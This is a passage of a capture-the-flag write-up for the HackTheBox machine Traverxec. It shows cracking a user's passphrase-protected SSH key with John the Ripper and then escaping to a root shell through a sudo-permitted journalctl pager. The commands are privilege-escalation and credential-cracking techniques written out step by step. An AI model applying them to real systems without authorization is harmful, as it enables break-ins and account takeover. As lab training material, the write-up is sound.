+</span></span></code></pre></div><p>Sadly enough, he has password protected his key.<br>The password we cracked earlier doesn&rsquo;t help here either.</p><p>Let&rsquo;s try to crack the private key.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>$ cd findings/home/david/.ssh/
+</span></span><span style=display:flex><span>$ /usr/share/john/ssh2john.py id_rsa &gt; ../../../id_rsa.txt
+</span></span><span style=display:flex><span>$ cd ../../..
+</span></span><span style=display:flex><span>$ john id_rsa.txt 
+</span></span><span style=display:flex><span>Using default input encoding: UTF-8
+</span></span><span style=display:flex><span>Loaded <span style=color:#ae81ff>1</span> password hash <span style=color:#f92672>(</span>SSH <span style=color:#f92672>[</span>RSA/DSA/EC/OPENSSH <span style=color:#f92672>(</span>SSH private keys<span style=color:#f92672>)</span> 32/64<span style=color:#f92672>])</span>
+</span></span><span style=display:flex><span>Cost <span style=color:#ae81ff>1</span> <span style=color:#f92672>(</span>KDF/cipher <span style=color:#f92672>[</span>0<span style=color:#f92672>=</span>MD5/AES 1<span style=color:#f92672>=</span>MD5/3DES 2<span style=color:#f92672>=</span>Bcrypt/AES<span style=color:#f92672>])</span> is <span style=color:#ae81ff>0</span> <span style=color:#66d9ef>for</span> all loaded hashes
+</span></span><span style=display:flex><span>Cost <span style=color:#ae81ff>2</span> <span style=color:#f92672>(</span>iteration count<span style=color:#f92672>)</span> is <span style=color:#ae81ff>1</span> <span style=color:#66d9ef>for</span> all loaded hashes
+</span></span><span style=display:flex><span>Will run <span style=color:#ae81ff>4</span> OpenMP threads
+</span></span><span style=display:flex><span>Note: This format may emit false positives, so it will keep trying even after
+</span></span><span style=display:flex><span>finding a possible candidate.
+</span></span><span style=display:flex><span>Proceeding with single, rules:Single
+</span></span><span style=display:flex><span>Press <span style=color:#e6db74>&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span style=color:#66d9ef>for</span> status
+</span></span><span style=display:flex><span>Warning: Only <span style=color:#ae81ff>2</span> candidates buffered <span style=color:#66d9ef>for</span> the current salt, minimum <span style=color:#ae81ff>8</span> needed <span style=color:#66d9ef>for</span> performance.
+</span></span><span style=display:flex><span>Warning: Only <span style=color:#ae81ff>5</span> candidates buffered <span style=color:#66d9ef>for</span> the current salt, minimum <span style=color:#ae81ff>8</span> needed <span style=color:#66d9ef>for</span> performance.
+</span></span><span style=display:flex><span>Warning: Only <span style=color:#ae81ff>2</span> candidates buffered <span style=color:#66d9ef>for</span> the current salt, minimum <span style=color:#ae81ff>8</span> needed <span style=color:#66d9ef>for</span> performance.
+</span></span><span style=display:flex><span>Warning: Only <span style=color:#ae81ff>7</span> candidates buffered <span style=color:#66d9ef>for</span> the current salt, minimum <span style=color:#ae81ff>8</span> needed <span style=color:#66d9ef>for</span> performance.
+</span></span><span style=display:flex><span>Almost <span style=color:#66d9ef>done</span>: Processing the remaining buffered candidate passwords, <span style=color:#66d9ef>if</span> any.
+</span></span><span style=display:flex><span>Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
+</span></span><span style=display:flex><span>hunter           <span style=color:#f92672>(</span>id_rsa<span style=color:#f92672>)</span>
+</span></span></code></pre></div><p>Since <em>hunter</em> isn&rsquo;t quite as strong as <em>hunter2</em>, we get the password in a matter of seconds.</p><h3 id=weve-got-the-user-flag>We&rsquo;ve got the user flag <a href=#weve-got-the-user-flag>¶</a></h3><p>We now login as David using the key and password we collected.<br>And TADA here&rsquo;s user.txt 🙂</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>$ ssh -i id_rsa david@traverxec.htb
+</span></span><span style=display:flex><span>Enter passphrase <span style=color:#66d9ef>for</span> key <span style=color:#e6db74>&#39;id_rsa&#39;</span>: <span style=color:#75715e>#hunter</span>
+</span></span><span style=display:flex><span>Linux traverxec 4.19.0-6-amd64 <span style=color:#75715e>#1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64</span>
+</span></span><span style=display:flex><span>Last login: Fri Jan <span style=color:#ae81ff>24</span> 09:16:26 <span style=color:#ae81ff>2020</span> from 10.10.15.165
+</span></span><span style=display:flex><span>david@traverxec:~$ ls
+</span></span><span style=display:flex><span>bin poop.sh public_www user.txt
+</span></span></code></pre></div><h2 id=get-root>Get root <a href=#get-root>¶</a></h2><p>Looking at the contents of David&rsquo;s home directory, we find an interesting script.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>david@traverxec:~$ ls
+</span></span><span style=display:flex><span>bin public_www user.txt
+</span></span><span style=display:flex><span>david@traverxec:~$ ls bin/
+</span></span><span style=display:flex><span>server-stats.head  server-stats.sh
+</span></span></code></pre></div><p>Let&rsquo;s look at the content of it.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>david@traverxec:~$ cat bin/server-stats.sh                                                     
+</span></span><span style=display:flex><span><span style=color:#75715e>#!/bin/bash</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>cat /home/david/bin/server-stats.head
+</span></span><span style=display:flex><span>echo <span style=color:#e6db74>&#34;Load: `/usr/bin/uptime`&#34;</span>
+</span></span><span style=display:flex><span>echo <span style=color:#e6db74>&#34; &#34;</span>
+</span></span><span style=display:flex><span>echo <span style=color:#e6db74>&#34;Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`&#34;</span>
+</span></span><span style=display:flex><span>echo <span style=color:#e6db74>&#34;Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`&#34;</span>
+</span></span><span style=display:flex><span>echo <span style=color:#e6db74>&#34; &#34;</span>
+</span></span><span style=display:flex><span>echo <span style=color:#e6db74>&#34;Last 5 journal log lines:&#34;</span>
+</span></span><span style=display:flex><span>/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat
+</span></span></code></pre></div><p>It looks like script prints the contents of <code>server-stats.head</code> followed by some server stats.</p><p>Notice how sudo is used to print the last piece of stats.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>david@traverxec:~$ bin/server-stats.sh 
+</span></span><span style=display:flex><span>                                                                          .----.
+</span></span><span style=display:flex><span>                                                              .---------. | <span style=color:#f92672>==</span> |
+</span></span><span style=display:flex><span>   Webserver Statistics and Data                              |.-<span style=color:#e6db74>&#34;&#34;&#34;&#34;&#34;-.| |----|
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>         Collection Script                                    ||       || | == |
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>          (c) David, 2019                                     ||       || |----|
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>                                                              |&#39;-.....-&#39;| |::::|
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>                                                              &#39;&#34;&#34;)---(&#34;&#34;&#39; |___.|
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>                                                             /:::::::::::\&#34;    &#34;</span>
+</span></span><span style=display:flex><span>                                                            /:::<span style=color:#f92672>=======</span>:::<span style=color:#ae81ff>\
+</span></span></span><span style=display:flex><span><span style=color:#ae81ff></span>                                                        jgs <span style=color:#e6db74>&#39;&#34;&#34;&#34;&#34;&#34;&#34;&#34;&#34;&#34;&#34;&#34;&#34;&#34;&#39;</span> 
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Load:  09:24:00 up <span style=color:#ae81ff>1</span> min,  <span style=color:#ae81ff>3</span> users,  load average: 0.15, 0.07, 0.02
+</span></span><span style=display:flex><span>  
+</span></span><span style=display:flex><span>Open nhttpd sockets: <span style=color:#ae81ff>0</span>
+</span></span><span style=display:flex><span>Files in the docroot: <span style=color:#ae81ff>117</span>
+</span></span><span style=display:flex><span>  
+</span></span><span style=display:flex><span>Last <span style=color:#ae81ff>5</span> journal log lines:
+</span></span><span style=display:flex><span>-- Logs begin at Fri 2020-01-24 09:22:52 EST, end at Fri 2020-01-24 09:24:00 EST. --
+</span></span><span style=display:flex><span>Jan <span style=color:#ae81ff>24</span> 09:22:56 traverxec systemd<span style=color:#f92672>[</span>1<span style=color:#f92672>]</span>: Starting nostromo nhttpd server...
+</span></span><span style=display:flex><span>Jan <span style=color:#ae81ff>24</span> 09:22:56 traverxec nhttpd<span style=color:#f92672>[</span>417<span style=color:#f92672>]</span>: started
+</span></span><span style=display:flex><span>Jan <span style=color:#ae81ff>24</span> 09:22:56 traverxec nhttpd<span style=color:#f92672>[</span>417<span style=color:#f92672>]</span>: max. file descriptors <span style=color:#f92672>=</span> <span style=color:#ae81ff>1040</span> <span style=color:#f92672>(</span>cur<span style=color:#f92672>)</span> / <span style=color:#ae81ff>1040</span> <span style=color:#f92672>(</span>max<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>Jan <span style=color:#ae81ff>24</span> 09:22:56 traverxec systemd<span style=color:#f92672>[</span>1<span style=color:#f92672>]</span>: Started nostromo nhttpd server.
+</span></span></code></pre></div><p>Let&rsquo;s copy the script to a more private space, so we don&rsquo;t bother the other players.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>david@traverxec:~$ cd /dev/shm/
+</span></span><span style=display:flex><span>david@traverxec:/dev/shm$ cp ~/bin/server-stats.* ./
+</span></span></code></pre></div><p>Attempting to run anything other than the journalctl file always results in us having to provide the password of David, which we don&rsquo;t have. This means the sudoers file probably restricts what we can run as sudo.</p><p>SPOILER:<br>Once we got root access, it was possible to look into <code>/etc/sudoers</code> and see exacly what the limitations on our use of sudo was.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># Allow david to tail last 5 lines of nhttpd logs for the server stats script.</span>
+</span></span><span style=display:flex><span><span style=color:#75715e># Should be safe.</span>
+</span></span><span style=display:flex><span>david   ALL<span style=color:#f92672>=(</span>ALL:ALL<span style=color:#f92672>)</span> NOPASSWD:/usr/bin/journalctl -n5 -unostromo.service
+</span></span></code></pre></div><p>Assuming our sudo privileges are limited to running journalctl, let&rsquo;s see whether we can abuse this tool to get a shell.</p><p><a href=https://gtfobins.github.io/gtfobins/journalctl/ target=_blank rel=noopener>GTFOBins</a> to the rescue!</p><p>Since journalctl calls a pager, like less, we could possibly abuse it to run a shell command.</p><p>However, since output is piped to cat, we don&rsquo;t get the pager.</p><p>What if we remove the pipe to cat?<br>Let&rsquo;s change our copy of the script and remove that part of the following line:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
+</span></span></code></pre></div><p>To get the pager, our screen must be small enough so it doesn&rsquo;t fit 5 lines.<br>You can resize your terminal.<br>I use tmux, so I create an extra pane below my current one and resize my pane so it&rsquo;s less than 5 lines high</p><h3 id=got-the-root-flag>Got the root flag <a href=#got-the-root-flag>¶</a></h3><p>We then run the script, giving us the output of the script paged in <code>less</code>, allowing us to open up a shell as root (due to the use of sudo).</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>david@traverxec:/dev/shm$ ./server-stats.sh
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>!/bin/sh
+</span></span><span style=display:flex><span><span style=color:#75715e># id</span>
+</span></span><span style=display:flex><span>uid<span style=color:#f92672>=</span>0<span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>0<span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>0<span style=color:#f92672>(</span>root<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span><span style=color:#75715e># cat /root/root.txt</span>
+</span></span><span style=display:flex><span>9a##########06
+</span></span></code></pre></div><p>And there we have the root flag 🙂</p></div></article><hr><div class=post-info><p><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 01-2.83.0L2 12V2h10l8.59 8.59a2 2 0 010 2.82z"/><line x1="7" y1="7" x2="7" y2="7"/></svg>
+<span rel=tag class="tag p-category"><a href=https://sequr.be/tags/hackthebox.eu/>HackTheBox.eu</a></span>
+<span rel=tag class="tag p-category"><a href=https://sequr.be/tags/jkr/>jkr</a></span>
+<span rel=tag class="tag p-category"><a href=https://sequr.be/tags/machine/>Machine</a></span>
+<span rel=tag class="tag p-category"><a href=https://sequr.be/tags/traverxec/>Traverxec</a></span></p><p><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-folder meta-icon"><path d="M22 19a2 2 0 01-2 2H4a2 2 0 01-2-2V5a2 2 0 012-2h5l2 3h9a2 2 0 012 2z"/></svg>
+<span class=tag><a class=p-category href=https://sequr.be/categories/hack-the-box/>Hack The Box</a></span>
+<span class=tag><a class=p-category href=https://sequr.be/categories/writeup/>Writeup</a></span></p><p><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text"><path d="M14 2H6A2 2 0 004 4v16a2 2 0 002 2h12a2 2 0 002-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="16" y1="13" x2="8" y2="13"/><line x1="16" y1="17" x2="8" y2="17"/><polyline points="10 9 9 9 8 9"/></svg>
+2294 Words</p><p><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"/><line x1="16" y1="2" x2="16" y2="6"/><line x1="8" y1="2" x2="8" y2="6"/><line x1="3" y1="10" x2="21" y2="10"/></svg>
+<time class=dt-published datetime=2020-01-24T17:24:02+01:00>2020-01-24
+</time>(Last updated: <time class=dt-updated datetime=2020-01-24T17:24:02+01:00>2020-01-24</time>)</p><p><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-user"><path d="M20 21v-2a4 4 0 00-4-4H8a4 4 0 00-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
+<span rel=author class="p-author h-card">DezeStijn</span></p><p><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-link"><path d="M10 13a5 5 0 007.54.54l3-3a5 5 0 00-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 00-7.54-.54l-3 3a5 5 0 007.07 7.07l1.71-1.71"/></svg>
+<span rel=bookmark class=u-url><a href=https://sequr.be/390505799>https://sequr.be/390505799</a></span></p></div><hr><div class=sharing-buttons><a class=resp-sharing-button__link href=https://ko-fi.com/s4squatch target=_blank rel=noopener aria-label title="Buy me a coffee"><div class="resp-sharing-button resp-sharing-button--small"><div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg width="24" height="24" viewBox="0 0 24 24" fill="currentcolor" stroke="none" stroke-width="1" stroke-linecap="round" stroke-linejoin="round"><path d="M23.881 8.948c-.773-4.085-4.859-4.593-4.859-4.593H.723c-.604.0-.679.798-.679.798s-.082 7.324-.022 11.822c.164 2.424 2.586 2.672 2.586 2.672s8.267-.023 11.966-.049c2.438-.426 2.683-2.566 2.658-3.734 4.352.24 7.422-2.831 6.649-6.916zm-11.062 3.511c-1.246 1.453-4.011 3.976-4.011 3.976s-.121.119-.31.023c-.076-.057-.108-.09-.108-.09-.443-.441-3.368-3.049-4.034-3.954-.709-.965-1.041-2.7-.091-3.71.951-1.01 3.005-1.086 4.363.407.0.0 1.565-1.782 3.468-.963 1.904.82 1.832 3.011.723 4.311zm6.173.478c-.928.116-1.682.028-1.682.028V7.284h1.77s1.971.551 1.971 2.638c0 1.913-.985 2.667-2.059 3.015z"/></svg></div></div></a><a class=resp-sharing-button__link href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fsequr.be%2fblog%2f2020%2f01%2ftraverxec%2f" target=_blank rel=noopener aria-label title="Share on facebook"><div class="resp-sharing-button resp-sharing-button--facebook resp-sharing-button--small"><div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 2h-3a5 5 0 00-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 011-1h3z"/></svg></div></div></a><a class=resp-sharing-button__link href="https://twitter.com/intent/tweet/?url=https%3a%2f%2fsequr.be%2fblog%2f2020%2f01%2ftraverxec%2f" target=_blank rel=noopener aria-label title="Share on twitter"><div class="resp-sharing-button resp-sharing-button--twitter resp-sharing-button--small"><div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M23 3a10.9 10.9.0 01-3.14 1.53 4.48 4.48.0 00-7.86 3v1A10.66 10.66.0 013 4s-4 9 5 13a11.64 11.64.0 01-7 2c9 5 20 0 20-11.5a4.5 4.5.0 00-.08-.83A7.72 7.72.0 0023 3z"/></svg></div></div></a><a class=resp-sharing-button__link href="https://reddit.com/submit/?url=https%3a%2f%2fsequr.be%2fblog%2f2020%2f01%2ftraverxec%2f&amp;resubmit=true&amp;title=Traverxec" target=_blank rel=noopener aria-label title="Share on reddit"><div class="resp-sharing-button resp-sharing-button--reddit resp-sharing-button--small"><div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg width="24" height="24" viewBox="0 0 24 24" fill="currentcolor" stroke="none"><path d="M12 0A12 12 0 000 12a12 12 0 0012 12 12 12 0 0012-12A12 12 0 0012 0zm5.01 4.744c.688.0 1.25.561 1.25 1.249a1.25 1.25.0 01-2.498.056l-2.597-.547-.8 3.747c1.824.07 3.48.632 4.674 1.488.308-.309.73-.491 1.207-.491.968.0 1.754.786 1.754 1.754.0.716-.435 1.333-1.01 1.614a3.111 3.111.0 01.042.52c0 2.694-3.13 4.87-7.004 4.87s-7.004-2.176-7.004-4.87c0-.183.015-.366.043-.534A1.748 1.748.0 014.028 12c0-.968.786-1.754 1.754-1.754.463.0.898.196 1.207.49 1.207-.883 2.878-1.43 4.744-1.487l.885-4.182a.342.342.0 01.14-.197.35.35.0 01.238-.042l2.906.617a1.214 1.214.0 011.108-.701zM9.25 12C8.561 12 8 12.562 8 13.25c0 .687.561 1.248 1.25 1.248.687.0 1.248-.561 1.248-1.249S9.937 12 9.249 12zm5.5.0c-.687.0-1.248.561-1.248 1.25.0.687.561 1.248 1.249 1.248S16 13.937 16 13.249c0-.687-.562-1.249-1.25-1.249zm-5.466 3.99a.327.327.0 00-.231.094.33.33.0 000 .463c.842.842 2.484.913 2.961.913s2.105-.056 2.961-.913a.361.361.0 00.029-.463.33.33.0 00-.464.0c-.547.533-1.684.73-2.512.73-.828.0-1.979-.196-2.512-.73a.326.326.0 00-.232-.095z"/></svg></div></div></a><a class=resp-sharing-button__link href="mailto:?subject=Traverxec&amp;body=https%3a%2f%2fsequr.be%2fblog%2f2020%2f01%2ftraverxec%2f" target=_self rel=noopener aria-label title="Share via email"><div class="resp-sharing-button resp-sharing-button--email resp-sharing-button--small"><div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1.0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1.0-2-.9-2-2V6c0-1.1.9-2 2-2z"/><polyline points="22,6 12,13 2,6"/></svg></div></div></a></div><div class=pagination><div class=pagination__buttons><span class="button previous"><a href=https://sequr.be/blog/2020/03/challenge-write-ups/><span class=button__icon>←</span>
+<span class=button__text>Challenge write-ups</span>
+</a></span><span class="button next"><a href=https://sequr.be/blog/2020/01/bandit-30-34/><span class=button__text>Bandit (30 -> 34)</span>
+<span class=button__icon>→</span></a></span></div></div></main></div><footer class="footer h-card"><div class=footer__inner><div class=footer__content><span>&copy; 2019</span>
+<span><a class="p-name u-url" rel=me href=https://sequr.be/>DezeStijn</a></span>
+<span><a href=https://creativecommons.org/licenses/by-nc-sa/4.0/ target=_blank rel=noopener>CC BY-NC-SA 4.0</a></span>
+<span><a href=https://sequr.be/blog/index.xml target=_blank title=rss><svg width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 019 9"/><path d="M4 4a16 16 0 0116 16"/><circle cx="5" cy="19" r="1"/></svg></a></span></div></div></footer></div><script type=text/javascript src=https://sequr.be/bundle.min.e89fda0f29b95d33f6f4224dd9e5cf69d84aff3818be2b0d73e731689cc374261b016d17d46f8381962fb4a1577ba3017b1f23509d894f6e66431f988c00889e.js integrity="sha512-6J/aDym5XTP29CJN2eXPadhK/zgYvisNc+cxaJzDdCYbAW0X1G+DgZYvtKFXe6MBex8jUJ2JT25mQx+YjACIng=="></script></body></html>
